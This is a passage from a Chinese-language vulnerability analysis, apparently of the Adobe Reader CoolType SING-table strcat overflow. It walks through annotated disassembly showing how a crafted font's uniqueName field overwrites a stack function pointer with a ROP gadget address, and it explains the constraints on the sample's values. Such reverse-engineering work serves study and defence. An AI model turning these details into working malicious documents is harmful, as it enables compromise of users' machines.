class="line"></span><br><span class="line">        _<span class="built_in">DWORD</span> *__thiscall sub_8083452(_<span class="built_in">DWORD</span> *this, <span class="keyword">int</span> a2)</span><br><span class="line"></span><br><span class="line">********************************************************************</span><br><span class="line"><span class="number">08083452</span>    6A 0C              <span class="keyword">push</span> <span class="number">0xC</span></span><br><span class="line"><span class="number">08083454</span>    B8 0A581708        <span class="keyword">mov</span> <span class="built_in">eax</span>,CoolType.0817580A</span><br><span class="line"><span class="number">08083459</span>    E8 404DFCFF        <span class="keyword">call</span> CoolType.0804819E</span><br><span class="line">0808345E    8BF1               <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">ecx</span>                                      &lt;-----<span class="comment">; esi=ecx=0x0012E6B0,对象(0x0012E6B0)首地址</span></span><br><span class="line"><span class="number">08083460</span>    <span class="number">8975</span> F0            <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>],<span class="built_in">esi</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">08083489</span>    8B46 <span class="number">14</span>            <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>+<span class="number">0x14</span>]                  <span class="comment">; eax=[esi+0x14]=[0x0012E6C4]=0x049513E0,字体对象</span></span><br><span class="line">0808348C    <span class="number">8946</span> 1C            <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>+<span class="number">0x1C</span>],<span class="built_in">eax</span>                  <span class="comment">; [esi+0x1C]=[0x0012E6CC]=eax=0x049513E0</span></span><br><span class="line">0808348F    C746 <span class="number">20</span> EF330808   <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>+<span class="number">0x20</span>],CoolType.080833EF    &lt;-----<span class="comment">; [esi+0x20]=[0x0012E6B0+0x20]=[0x0012E6D0]=0x080833EF</span></span><br><span class="line"><span class="number">08083496</span>    <span class="number">8976</span> <span class="number">24</span>            <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>+<span class="number">0x24</span>],<span class="built_in">esi</span></span><br><span class="line"><span class="number">08083499</span>    8BC6               <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">esi</span></span><br><span class="line">0808349B    E8 D64DFCFF        <span class="keyword">call</span> CoolType<span class="meta">.08048276</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">***********************************************************************************</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> __cdecl sub_80DD0B3(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4, _<span class="built_in">DWORD</span> *a5, <span class="keyword">int</span> a6)</span><br><span class="line"></span><br><span class="line">***********************************************************************************</span><br><span class="line">080DD168       <span class="keyword">call</span> CoolType.080151B5              <span class="comment">; 清零0x0012E718后面的一些数据,0x0012E718应该为某个对象的首地址,此函数像是类的构造函数</span></span><br><span class="line">.......</span><br><span class="line">080DD1A3       <span class="keyword">call</span> CoolType.0801605B</span><br><span class="line">080DD1A8       <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x68</span>]     <span class="comment">; esi=[ebp-0x68]=[0x0012E6B0]=0x02137E88</span></span><br><span class="line">080DD1AB       <span class="keyword">neg</span> <span class="built_in">esi</span>                             <span class="comment">; 求补: esi=0xFDEC8178(按位取反再+1),求补操作和求一个数的补码概念是不一样的</span></span><br><span class="line">080DD1AD       <span class="keyword">sbb</span> <span class="built_in">esi</span>,<span class="built_in">esi</span>                         <span class="comment">; 带借位减法:esi=FFFFFFFF</span></span><br><span class="line">080DD1AF       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x48</span>]     <span class="comment">; eax=ebp-0x68=0x0012E718-0x48=0x0012E6D0 ,函数指针地址</span></span><br><span class="line">080DD1B2       <span class="keyword">and</span> <span class="built_in">esi</span>,<span class="built_in">eax</span>                         <span class="comment">; esi=esi and eax=0x0012E6D0 </span></span><br><span class="line">080DD1B4       <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x28</span>],<span class="number">0x1</span>     <span class="comment">; [ebp-0x28]=[0x0012E718-0x28]=[0x0012E6F0]=0x1</span></span><br><span class="line">080DD1B8       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0x3C</span>],<span class="built_in">esi</span>     <span class="comment">; [ebp+0x3C]=[0x0012E754]=esi=0x0012E6D0 &lt;-------这里得到赋值,在这之前[0x0012E6D0]已在sub_8083452()[对象(0x0012E6B0)的构造函数]中得到赋值,[0x0012E6D0]=0x080833EF,0x0012E6D0处的成员变量为函数指针</span></span><br><span class="line">080DD1BB       <span class="keyword">jnz</span> CoolType.080DD2D1               <span class="comment">; 不跳转</span></span><br><span class="line">080DD1C1       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>]</span><br><span class="line">080DD1C4       <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">080DD1C5       <span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line">080DD1C6       <span class="keyword">push</span> <span class="number">0x2</span></span><br><span class="line">080DD1C8       <span class="keyword">push</span> <span class="built_in">esi</span></span><br><span class="line">080DD1C9       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>],<span class="built_in">ebx</span></span><br><span class="line">080DD1CC       <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]             <span class="comment">; CoolType.080833EF</span></span><br><span class="line">080DD1CE       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>]</span><br><span class="line">080DD1D1       <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">080DD1D2       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x3C</span>]</span><br><span class="line">080DD1D5       <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">080DD1D6       <span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line">080DD1D7       <span class="keyword">push</span> <span class="built_in">esi</span></span><br><span class="line">080DD1D8       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>],<span class="built_in">edi</span></span><br><span class="line">080DD1DB       <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]             <span class="comment">; CoolType.080833EF</span></span><br><span class="line">080DD1DD       <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">0x20</span></span><br><span class="line">080DD1E0       <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>],<span class="built_in">edi</span></span><br><span class="line">080DD1E3       <span class="keyword">je</span> short CoolType.080DD1F0</span><br><span class="line">080DD1E5       <span class="keyword">push</span> CoolType.081BA878</span><br><span class="line">080DD1EA       <span class="keyword">call</span> CoolType.0809D83E</span><br><span class="line">080DD1EF       <span class="keyword">pop</span> <span class="built_in">ecx</span></span><br><span class="line">080DD1F0       <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>]</span><br><span class="line">080DD1F3       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x3C</span>]</span><br><span class="line">080DD1F6       <span class="keyword">push</span> CoolType.0819D5F8              <span class="comment">; ASCII "ttcf"</span></span><br><span class="line">080DD1FB       <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">080DD1FC       <span class="keyword">call</span> &lt;<span class="keyword">jmp</span>.&amp;MSVCR80.memcmp&gt;</span><br><span class="line">080DD201       <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">0xC</span></span><br><span class="line">080DD204       <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line">080DD206       <span class="keyword">jnz</span> CoolType.080DD2D1               <span class="comment">; 跳转</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line"><span class="symbol">.text:</span>080DD2D1 loc_80DD2D1:                          </span><br><span class="line"><span class="symbol">.text:</span>080DD2D1                              </span><br><span class="line"><span class="symbol">.text:</span>080DD2D1         <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_1E0]</span><br><span class="line"><span class="symbol">.text:</span>080DD2D7         <span class="keyword">call</span>    sub_80172FB</span><br><span class="line"><span class="symbol">.text:</span>080DD2DC         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_E8], <span class="built_in">ebx</span>                       <span class="comment">;   [ebp-0x18]=[0x0012E700]=0x0</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2DF         <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_E8]                       <span class="comment">;   eax=ebp-0x18=0x0012E700</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2E2         <span class="keyword">push</span>    <span class="built_in">eax</span>                                          <span class="comment">; arg_4: [0x0012E5F4]=eax=0x0012E700</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2E3         <span class="keyword">push</span>    <span class="built_in">ebx</span>                                          <span class="comment">; arg_3: [0x0012E5F0]=ebx=0x0</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2E4         <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_1E0]                      <span class="comment">;   eax=ebp-0x110=0x0012E718-0x110=0x0012E608</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EA         <span class="keyword">push</span>    <span class="built_in">eax</span>                                          <span class="comment">; arg_2: [0x0012E5EC]=eax=0x0012E608,对象(0x0012E608)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EB         <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+value1_823A850]               <span class="comment">;   eax=ebp=0x0012E718</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EE         <span class="keyword">push</span>    <span class="built_in">eax</span>                                          <span class="comment">; arg_1: [0x0012E5E8]=0x0012E718,对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2EF         <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0D0h</span>+var_D4], <span class="number">4</span>                <span class="comment">; [ebp-0x4]=[0x0012E714]=4</span></span><br><span class="line"><span class="symbol">.text:</span>080DD2F3         <span class="keyword">call</span>    sub_803DCF9      &lt;-------</span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line">******************************************************************************</span><br><span class="line"></span><br><span class="line">        char __cdecl sub_803DCF9(<span class="keyword">int</span> a1, _<span class="built_in">DWORD</span> *a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span><br><span class="line"></span><br><span class="line">******************************************************************************</span><br><span class="line"><span class="symbol">.text:</span>0803DCF9         <span class="keyword">push</span>    <span class="built_in">ebp</span>                      <span class="comment">; ebp=0x0012E718</span></span><br><span class="line"><span class="symbol">.text:</span>0803DCFA         <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">104h</span>                <span class="comment">; esp=0x0012E4DC,分配局部变量栈空间</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD00         <span class="keyword">lea</span>     <span class="built_in">ebp</span>, [<span class="built_in">esp</span>-<span class="number">4</span>]             <span class="comment">; ebp=0x0012E4D8</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD04         <span class="keyword">mov</span>     <span class="built_in">eax</span>, ___security_cookie  <span class="comment">; eax=0x98C49E84</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD09         <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span>                 <span class="comment">; eax=eax^ebp=0x98D67A5C</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD0B         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_4], <span class="built_in">eax</span>    <span class="comment">; [ebp+0x104] = [0x0012E5DC] = 0x98D67A5C</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD11         <span class="keyword">push</span>    <span class="number">4Ch</span>                      <span class="comment">; [0x0012E4D8]=0x4C(分配栈空间大小)</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD13         <span class="keyword">mov</span>     <span class="built_in">eax</span>, offset loc_8184A54  <span class="comment">; eax=0x8184A54(__security_check_cookie)</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD18         <span class="keyword">call</span>    __EH_prolog3_catch       <span class="comment">; [0x0012E4D4]=0x0803DD1D,ret</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line"><span class="symbol">.text:</span>080481D1 __EH_prolog3_catch proc <span class="built_in">near</span>(向栈上写入SEH结构)</span><br><span class="line"></span><br><span class="line">080481D1       <span class="keyword">push</span> <span class="built_in">eax</span>                            <span class="comment">; [0x0012E4D0]=0x8184A54(__security_check_cookie)</span></span><br><span class="line">080481D2       <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>]               <span class="comment">; [0x0012E4CC]=0x0012E70C,指向下一个SEH记录的指针</span></span><br><span class="line">080481D9       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>+<span class="number">0xC</span>]      <span class="comment">; eax=esp+0xc=0x0012E4CC+0xc=0x0012E4D8</span></span><br><span class="line">080481<span class="built_in">DD</span>       <span class="keyword">sub</span> <span class="built_in">esp</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>+<span class="number">0xC</span>]      <span class="comment">; esp=esp-[0x0012E4D8]=0x0012E4CC-0x4C=0x0012E480,再次分配局部变量栈空间</span></span><br><span class="line">080481E1       <span class="keyword">push</span> <span class="built_in">ebx</span>                            <span class="comment">; [0x0012E47C]=ebx=0x0</span></span><br><span class="line">080481E2       <span class="keyword">push</span> <span class="built_in">esi</span>                            <span class="comment">; [0x0012E478]=esi=0x0012E6D0</span></span><br><span class="line">080481E3       <span class="keyword">push</span> <span class="built_in">edi</span>                            <span class="comment">; [0x0012E474]=edi=0x4</span></span><br><span class="line">080481E4       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>],<span class="built_in">ebp</span>          <span class="comment">; [eax]=[0x0012E4D8]=ebp=0x0012E4D8,覆盖传进来的参数0x4C</span></span><br><span class="line">080481E6       <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">eax</span>                         <span class="comment">;</span></span><br><span class="line">080481E8       <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">0x8230FB8</span>]    <span class="comment">; eax=ds:[0x8230FB8]=0x78FC1194(___security_cookie)</span></span><br><span class="line">080481ED       <span class="keyword">xor</span> <span class="built_in">eax</span>,<span class="built_in">ebp</span>                         <span class="comment">; eax=eax^ebp=0x78FC1194^0x0012E4D8=0x78EEF54C</span></span><br><span class="line">080481EF       <span class="keyword">push</span> <span class="built_in">eax</span>                            <span class="comment">; [0x0012E470]=0x78EEF54C</span></span><br><span class="line">080481F0       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x10</span>],<span class="built_in">esp</span>     <span class="comment">; [ebp-0x10]=[0x0012E4D8-0x10]=[0x0012E4C8]=esp=0x0012E470</span></span><br><span class="line">080481F3       <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x4</span>]         <span class="comment">; [0x0012E46C]=[ebp-0x4]=[0x0012E4D4]=0x0803DD1D,返回地址</span></span><br><span class="line">080481F6       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x4</span>],-<span class="number">0x1</span>     <span class="comment">; [0x0012E4D4]=0xFFFFFFFF,本来的返回地址被修改</span></span><br><span class="line">080481FD       <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0xC</span>]      <span class="comment">; eax=ebp-0xc=0x0012E4D8-0xc=0x0012E4CC(本SEH结构地址)</span></span><br><span class="line"><span class="number">08048200</span>       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">fs</span>:[<span class="number">0</span>],<span class="built_in">eax</span>            <span class="comment">; fs:[0] = 0x0012E4CC,保存当前SEH结构指针</span></span><br><span class="line"><span class="number">08048206</span>       <span class="keyword">retn</span>                                <span class="comment">; ret</span></span><br><span class="line">    |    |    |  </span><br><span class="line">    ↓    ↓    ↓</span><br><span class="line"><span class="symbol">.text:</span>0803DD1D         <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_C]            <span class="comment">; a4: eax=[ebp+0x11c]=[0x0012E5F4]=0x0012E700</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD23         <span class="keyword">mov</span>     <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_0]            <span class="comment">; a1: edi=[ebp+0x110]=[0x0012E5E8]=0x0012E718,对象(0x0012E718)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD29         <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+arg_4]            <span class="comment">; a2: ebx=[ebp+0x114]=[0x0012E5EC]=0x0012E608,对象(0x0012E608)的指针</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD2F         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_130], <span class="built_in">edi</span>          <span class="comment">; [ebp-0x28]=[0x0012E4B0]=edi=0x0012E718</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD32         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_138], <span class="built_in">eax</span>          <span class="comment">; [ebp-0x30]=[0x0012E4A8]=eax=0x0012E700</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD35         <span class="keyword">call</span>    sub_804172C</span><br><span class="line"><span class="symbol">.text:</span>0803DD3A         <span class="keyword">xor</span>     <span class="built_in">esi</span>, <span class="built_in">esi</span>                         <span class="comment">; esi=0x0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD3C         <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>+<span class="number">8</span>], <span class="number">3</span>             <span class="comment">; [edi+8]=[0x0012E720]=0x1</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD40         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="built_in">esi</span>          <span class="comment">; [ebp-0x4]=[0x0012E4D8-0x4]=[0x0012E4D4]=0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD43         <span class="keyword">jz</span>      loc_803DF00                      <span class="comment">; 不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD49         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_124], <span class="built_in">esi</span>          <span class="comment">; [ebp-0x1c]=[0x0012E4D8-0x1c]=[0x0012E4BC]=0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD4C         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_120], <span class="built_in">esi</span>          <span class="comment">; [ebp-0x18]=[0x0012E4D8-0x18]=[0x0012E4C0]=0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD4F         <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>+<span class="number">0Ch</span>], <span class="number">1</span>           <span class="comment">; [edi+0xc]=[0x0012E718+0xc]=[0x0012E724]=0x1</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD53         <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="number">1</span>   <span class="comment">; [ebp-0x4]=[0x0012E4D4]=0x0-&gt;0x1</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD57         <span class="keyword">jnz</span>     loc_803DEA9                      <span class="comment">; 不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD5D         <span class="keyword">push</span>    offset aName                     <span class="comment">; "name"</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD62         <span class="keyword">push</span>    <span class="built_in">edi</span>                              <span class="comment">; int</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD63         <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_124]</span><br><span class="line"><span class="symbol">.text:</span>0803DD66         <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_119], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD6A         <span class="keyword">call</span>    sub_80217D7</span><br><span class="line"><span class="symbol">.text:</span>0803DD6F         <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_124], <span class="built_in">esi</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD72         <span class="keyword">jnz</span>     short loc_803DDDD</span><br><span class="line"><span class="symbol">.text:</span>0803DD74     <span class="keyword">push</span>    offset aSing            <span class="comment">; "SING"</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD79     <span class="keyword">push</span>    <span class="built_in">edi</span>                     <span class="comment">; 类对象指针(0x0012E718),第一个变量为dword_823A850加1之前的值。</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD7A     <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_12C] <span class="comment">; ecx为字体对象,thiscall,ecx传参</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD7D     <span class="keyword">call</span>    sub_8021B06             <span class="comment">; 解析字体对象,处理SING表</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD82     <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_12C] <span class="comment">; eax指向SING表数据</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD85     <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="built_in">esi</span>                <span class="comment">; 判断是否为空</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD85 <span class="comment">;&#125; // starts at 803DD53</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD87 <span class="comment">;try &#123;</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD87     <span class="keyword">mov</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">108h</span>+var_10C], <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8B     <span class="keyword">jz</span>      short loc_803DDC4       <span class="comment">; 这里不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8D     <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>]              <span class="comment">; 字体资源版本号0.1,构造样本时小端写入,这里读出就变成了ecx=0x00010000,使其可以顺利执行到strcat</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD8F     <span class="keyword">and</span>     <span class="built_in">ecx</span>, <span class="number">0FFFFh</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD95     <span class="keyword">jz</span>      short loc_803DD9F       <span class="comment">; 这里跳转，jz和je机器码是一样的，IDA识别为jz，OllyDbg识别为je，这里jz感觉好理解一点</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD97     <span class="keyword">cmp</span>     <span class="built_in">ecx</span>, <span class="number">100h</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD9D     <span class="keyword">jnz</span>     short loc_803DDC0</span><br><span class="line"><span class="symbol">.text:</span>0803DD9F</span><br><span class="line"><span class="symbol">.text:</span>0803DD9F loc_803DD9F:                <span class="comment">; CODE XREF: sub_803DCF9+9C↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0803DD9F     <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">10h</span>                       <span class="comment">; 相对SING表入口偏移0x10处找到uniqueName</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA2     <span class="keyword">push</span>    <span class="built_in">eax</span>                            <span class="comment">; char *,strcat源地址入栈，也就是uniqueName起始地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA3     <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf] <span class="comment">; 这里将ebp的值作为目的地址，也就是前面所分配的缓冲区的起始地址</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA6     <span class="keyword">push</span>    <span class="built_in">eax</span>                            <span class="comment">; char *,strcat目的地址入栈</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDA7     <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+<span class="number">108h</span>+uniqueName_buf], <span class="number">0</span>   <span class="comment">; 将目标字符串赋值为NULL,空字符串</span></span><br><span class="line"><span class="symbol">.text:</span>0803DDAB     <span class="keyword">call</span>    strcat                         <span class="comment">; 调用strcat函数，造成溢出</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;通过上面的分析,我们可以知道,<code>样本</code>构造的<code>SING表</code>的<code>“uniqueName”字段</code>将栈上<code>对象(0x0012E6B0)</code>的一个<code>函数指针</code>类型的<code>成员变量(0x0012E6D0)</code>覆盖为了<code>ROPgadget(0x4A80CB38)</code>的地址。而触发点为<code>StreamHandler类</code>的<code>虚函数sub_808B116()</code>中地址<code>0x0808B308</code>处的调用指令<code>call dword ptr [eax]</code>,这条调用指令将<code>对象(0x0012E6B0)</code>中的<code>函数指针(0x0012E6D0)的值</code>作为调用地址,从而获得程序执行流的劫持。这个<code>函数指针的地址</code>又存储在<code>对象(0x0012E718)</code>中的一个<code>指针类型</code>的<code>成员变量(0x0012E754)</code>中。<code>虚函数sub_808B116()</code>通过传入的<code>参数对象(0x0012E718)</code>的指针,找到<code>对象(0x0012E6B0)</code>中的<code>函数指针(0x0012E6D0)</code>,进行函数调用,从而获得程序执行流的劫持。<br>&emsp;&emsp;所以,<code>metasploit</code>中的漏洞利用脚本,并不是通过覆盖<code>虚函数的指针</code>或<code>虚表指针</code>,以及<code>SEH结构</code>来控制程序执行流的。</p><h5 id="2-5、样本中SING表数据“0x4A8A08C6”的作用"><a href="#2-5、样本中SING表数据“0x4A8A08C6”的作用" class="headerlink" title="2.5、样本中SING表数据“0x4A8A08C6”的作用"></a>2.5、样本中SING表数据“0x4A8A08C6”的作用</h5><p>&emsp;&emsp;<code>0x4A8A08C6</code>是一个<code>地址值</code>,<code>0x4A8A08C6+0x1C=0x4A8A08E2</code>应具有<code>可读可写</code>权限。因为,在通过<code>strcat()</code>将<code>SING表数据</code>复制到<code>栈</code>上之后,以及获得<code>程序执行流</code>的劫持之前,会对<code>此地址</code>进行<code>读写</code>,所以构造的样本中<code>此处的地址+0x1C</code>必须具有<code>可读可写</code>权限,否则会<code>触发异常</code>,通过<code>SEH链</code>进入异常处理,就无法获得程序执行流的劫持。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 